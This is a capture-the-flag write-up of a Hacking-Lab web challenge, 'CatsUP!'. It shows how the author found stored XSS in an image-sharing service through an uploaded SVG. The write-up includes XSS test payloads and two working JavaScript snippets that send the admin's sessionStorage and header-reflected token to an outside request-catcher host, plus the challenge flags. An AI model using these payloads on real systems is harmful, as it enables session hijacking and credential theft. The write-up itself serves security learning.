
<header>
<h3>#1 Challenge: CatsUP! image sharing service</h3><br>
<img src="https://github.com/DejanJS/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/chimg.png" style="height: 80px;"/>
</header><br>
<h4><i>Challenge description:</i></h4>

<blockquote>
	<h5><i>Introduction</i></h5>
	<p>The admin of the image hosting service CatsUP! is keeping all the best pictures for himself, by removing them from the public web site. From a chat conversation with him we know that he is currently online and logged in to the admin panel.</p>
</blockquote>

<blockquote>
	<h5>Goal</h5>
	<p>The web site is vulnerable to a common web vulnerability which can be used to execute attacker controlled code to steal his session. Find the vulnerability and exploit it to steal his session token, which is stored in his browser's session storage. He also has a persistent login token stored as a cookie, but there is another hurdle to access that one. Can you find the two tokens?</p>
</blockquote>

<blockquote>
	<h5>NOTES</h5>
	<ul>
		<li>The Admin's Browser can only access Hacking-Lab services for security reasons</li>
		<li>Use the provided Request Catcher service as a web server under your control to exfiltrate the data</li>
	</ul>				
</blockquote>

<h4><i>Intro/Thought process</i></h4>

<p>After reading the description, name of the challenge is called CatsUP - first thought that came through my mind is that this challenge will be about some sort of XSS vulnerability. The reason is that from my previous experiences on CTFs usually title that includes "Cats" are about XSS.(I am quite sure that nearly every CTF player or security person knows this duuh!). Of course that doesn't mean that I am straight away right that this will be about XSS only.</p>
<p>Anyway plan is to do some enumeration and hope that I will find some weird behaviour.</p>

<h4><i>Finding of Initial Vector</i></h4>

<p>Upon entering the site, I see that I can:</p>

<ul>
	<li>Upload an image with name through input</li>
	<li>Browse a random image</li>
	<li>Download image</li>
	<li>Report image (that I've uploaded or randomly browsed) and send it to the admin</li>
</ul>

<p>As I could see there are a lot of space to test for unexpected behaviour. Before I started playing with input field for image name that I want to upload, I wanted to check for dissallowed paths through <code>robots.txt</code> file if it exists, this is just my usual tendency to start with on WebSec challenges... </p>
<p>It seems we had something there: </p>

<pre>
	User-agent: * 
	Disallow: /help/headers
	Disallow: /i/
</pre>


<p>I tried to access <b><i>/help/headers</i></b> and I got some headers for current user that is visiting application or something, which was kinda weird. </p>

<img src="https://github.com/DejanJS/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/httpheaders.png"/>


<p>As well I tried accessing <b><i>/i/</i></b> but I only got 404.</p>

<p>At this point I've decided to play with that input field with black box approach.<br></br> 
I provided printable ascii from Python's <code>string</code> library.
<br></br>
And uploaded my test image file which resulted into this:
</p>

```html
<h1>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\&#39;()*+,-./: is in the cloud...</h1>
<div class="row">
    <img src="/i/3cYVGRFEvLT9VoWx/jpg/1600" alt="Caaaat">
</div>
<p><a href="/i/3cYVGRFEvLT9VoWx/jpg/orig">Download original</a> (use save link target as)</p>
<p>Is this cat against our rules? <a class="btn btn-warning" data-bs-toggle="collapse" href="#report">Report image</a>
</p>
<div class="container collapse" id="report">
    <form method="POST" action="/report">
        <input type="hidden" name="url" value="/img/3cYVGRFEvLT9VoWx">
        <div class="form-check">
            <input class="form-check-input" type="radio" name="reason" value="notacat" id="notacat">
            <label class="form-check-label" for="notacat">
                This is not a cat
            </label>
        </div>
         [...]
        <button type="submit" class="btn btn-primary">Report image</button>
    </form>
</div>
```

<p>Characters that are being escaped are <code>'"<></code> of course there was 80 char limit on that input so last 20 characters got ignored.
So this was sanitized and there was nothing for me to do here in terms of input. 
Next I wanted to see how is this being sent to the server, I've intercepted upload request with Burp and checked the headers: 
</p>

<pre>
POST /upload HTTP/1.1
Host: 183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land
Connection: close
Content-Length: 21075
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAUN8vBcCotGBB3Yb
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryAUN8vBcCotGBB3Yb
Content-Disposition: form-data; name="name"

------WebKitFormBoundaryAUN8vBcCotGBB3Yb
Content-Disposition: form-data; name="image"; filename="test.jpeg"
Content-Type: image/jpeg
</pre>

<p>There is this WebKitFormBoundary with Content-Disposition, was thinking if I could make html injection and somehow sneak in some JavaScript there. Replacing <code>input</code> with <code>textarea</code> and trying to modify alt tags like name with this kind of payload:</p>

```html
 <textarea name='file"; filename="test.<img src=xx onerror=alert(1)>'>
```

<p>No luck there, this is also sanitized: </p>

```html
Content-Disposition: form-data; name="file%22; filename=%22test.<img src=xx onerror=alert(1)>"
```
<p>
At this point I was tapping in place for a while. After some time passed I've decided to lookup other features of the app. Browsed random image of a cat and downloaded it(through save image as). Exiftoold the image to see if there is anything interesting there. There were no interesting metadata in the image itself. Got an idea of trying to sneak JavaScript again through some exif metadata like Artist/Creator. And that was unfortunately sanitized as well: </p>


```xml
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>&quot;&gt;&lt;img src=z onerror=alert(1)&gt;</rdf:li>
   </rdf:Seq>
  </dc:creator>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

<p>But then I realized that it accepts SVG as well, so question that came up is:<br></br>why didn't I try uploading SVG that contains JavaScript at the first place???<br></br>I converted my test.jpeg into test.svg, added simple script with <code>alert("Boom")</code> inside of SVG and uploaded it.<br></br>

Next question: where the hell will this trigger?<br></br>

Well it was quite fishy that below uploaded image they had "Download Original" link and next to it: <b>(use save link target as)</b>. 
<br></br>
</p>


```html
<p><a href="/i/3cYVGRFEvLT9VoWx/jpg/orig">Download original</a> (use save link target as)</p>
```

<p>Clicked on download and my alert got triggered!</p>


<img src="https://github.com/DejanJS/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/xss.png"/>

<br></br>
<h4><i>Stealing session and token</i></h4>

<p>From this part it was clear that this is stored XSS. Next I had to steal the session cookie and the token. Description specified that token is not in the cookie though. Since I couldn't use my own server for exploit they offered us "Request Catcher" that will do the job for us. So first I wrote the script to steal the session: </p><br></br>

```javascript
(async function(){
   let data = await fetch("https://62e48ff7-bed8-46ee-91d5-b51fff6486cf.idocker.vuln.land/debug",{
        method:"POST",
        body: JSON.stringify(window.sessionStorage)
   })
})()
```


<p>Now it was time to report my uploaded evil SVG to an admin. Intercepting my request again with Burp and changing path to download path of my image:  </p>



<p>Report is done now just need to check captured request, there was my session which is the first flag: </p>

<img src="https://github.com/DejanJS/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_first_flag.png?raw=true"/>

<b>#1 FLAG: HL{catss_v3ct0r_d3t3cted!}</b>


<p>After I got my session I had to find a token that is not in the cookie, I connected the dots quite fast because of that robot.txt at the start, all what I had to do is to modify my script a little bit in a way that will reflect XSS. So it is actually quite simple, admin is logged in with token and session, we know that <b><i>/help/headers</i></b> was giving info about user who is making request in that case it was me, now we just need to make GET request to that path in context of an admin and exfiltrate data. 
<br></br>Here is my modified script:</p>

```javascript
(async function(){
   let url = "http://localhost/help/headers";
   let h = await fetch(url);
   let t = await h.text();
   let data = await fetch("https://62e48ff7-bed8-46ee-91d5-b51fff6486cf.idocker.vuln.land/debug",{
        method:"POST",
        body: t
   })
})()
```

<p>Checked the captured request and I got my token/second flag: </p>

<img src="https://github.com/DejanJS/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_second_flag.png" />

<b>#2 FLAG: <i>HL{r3fl3cted_c4t_p1ck1ng}</i></b>






